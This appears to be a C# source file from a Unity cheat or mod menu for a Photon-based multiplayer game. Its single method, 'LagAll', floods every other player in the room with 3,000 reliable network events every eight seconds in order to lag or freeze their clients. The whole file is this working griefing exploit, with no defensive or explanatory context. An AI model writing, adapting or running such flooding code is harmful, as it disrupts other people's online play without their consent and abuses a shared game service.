using ExitGames.Client.Photon;
using Photon.Pun;
using Photon.Realtime;
using System;
using System.Collections.Generic;
using System.Text;
using UnityEngine;

namespace AetherTemp.Mods
{
    internal class Overpowered
    {
        public static void LagAll()
        {
            if (PhotonNetwork.InRoom)
            {
                if (Time.time > LagThing)
                {
                    for (int i = 0; i < 3000; i++)
                    {
                        ExitGames.Client.Photon.Hashtable entries = new ExitGames.Client.Photon.Hashtable();
                        object[] sendEventData = new object[2];
                        sendEventData[0] = PhotonNetwork.ServerTimestamp;
                        sendEventData[1] = (byte)76;
                        entries.Add(i, sendEventData);
                        PhotonNetwork.NetworkingClient.OpRaiseEvent(210, entries, new RaiseEventOptions { Receivers = ReceiverGroup.Others }, SendOptions.SendReliable);
                        PhotonNetwork.SendAllOutgoingCommands();
                        PhotonNetwork.NetworkingClient.LoadBalancingPeer.SendOutgoingCommands();
                    }
                    LagThing = Time.time + 8f;
                }
            }
        }
        private static float LagThing;

    
    
    
    
    
    
    }
}
